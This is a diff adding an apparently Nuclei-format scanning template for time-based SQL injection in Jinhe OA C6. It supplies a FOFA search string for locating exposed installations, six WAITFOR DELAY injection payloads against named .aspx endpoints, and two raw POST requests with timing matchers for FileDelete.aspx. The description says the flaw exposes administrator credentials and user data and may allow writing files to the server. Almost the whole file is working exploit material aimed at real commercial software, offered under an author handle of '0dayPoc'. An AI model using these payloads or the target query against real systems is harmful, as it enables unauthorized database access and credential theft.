@@ -1,0 +1,46 @@
+id: jinhe-oa-filedelete-multiple-sqli
+info:
+  name: "金和 OA FileDelete.aspx 多接口 SQL 注入漏洞"
+  author: 0dayPoc
+  severity: high
+  description: |-
+    fofa: app="金和网络-金和OA"
+          金和网络作为专业信息化服务商，提供组织协同OA系统开发平台及电子政务解决方案。其OA C6系统中FileDelete.aspx接口关联的多个接口存在SQL注入缺陷。攻击者可通过构造恶意注入语句读取数据库敏感内容（包括管理员凭证及用户隐私数据），在特定权限条件下可能实现服务器端恶意文件写入，最终达成系统控制权获取。
+          POST /c6/Jhsoft.Web.accept/AcceptShow.aspx/ HTTP/1.1
+      appid=')WAITFOR DELAY '0:0:5'--/&id=-1
+      
+          POST /c6/Jhsoft.Web.AcceptAip/AcceptGetFileNameEdit.aspx/ HTTP/1.1
+      fileId=-1)WAITFOR DELAY '0:0:5'--
+      
+          POST /c6/Jhsoft.Web.AcceptAip/AcceptGetSourceFileName.aspx/ HTTP/1.1
+      strFileId=-1'WAITFOR DELAY '0:0:5'--&strAppFlag=-1
+      
+          POST /c6/Jhsoft.Web.AcceptAip/AcceptShow.aspx/ HTTP/1.1
+      id=-1'WAITFOR DELAY '0:0:5
+      
+          POST /c6/Jhsoft.Web.Accept/AcceptGetFileName.aspx/ HTTP/1.1
+      fileId=-1)/**/WAITFOR/**/DELAY'0:0:5'--
+      
+          POST /c6/Jhsoft.Web.Accept/AcceptGetFileNameAndPath.aspx/ HTTP/1.1
+      fileId=-1)/**/WAITFOR/**/DELAY'0:0:5'--
+  tags: 金和OA
+http:
+- raw:
+  - |
+    POST /c6/Jhsoft.Web.accept/FileDelete.aspx/ HTTP/1.1
+    Host: {{Hostname}}
+    Content-Type: application/x-www-form-urlencoded
+
+    SlaveID=-1')WAITFOR/**/DELAY'0:0:5'--/Temp/
+  - |
+    POST /c6/Jhsoft.Web.accept/FileDelete.aspx/ HTTP/1.1
+    Host: {{Hostname}}
+    Content-Type: application/x-www-form-urlencoded
+
+    SlaveID=-1')WAITFOR/**/DELAY'0:0:8'--/Temp/
+  matchers:
+  - type: dsl
+    dsl:
+    - duration_1>=5 && duration_1<=6
+    - duration_2>=8 && duration_2<=9
+    condition: and
